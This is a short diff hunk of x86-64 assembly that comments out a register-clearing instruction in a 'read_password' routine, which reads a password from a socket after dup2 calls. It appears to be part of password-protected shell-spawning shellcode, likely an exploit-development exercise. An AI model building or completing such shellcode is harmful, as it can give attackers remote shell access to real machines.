@@ -79,7 +79,7 @@ read_password:
     ; read(int fd, void *buf, size_t count)
     ; On success, the number of bytes read is returned
 
-    xor eax, eax
+    ;xor eax, eax  ; already done by dup2
     ;rdi = "sock"  ; already done
     push rax
     push rax       ; create space for "buf" in the stack
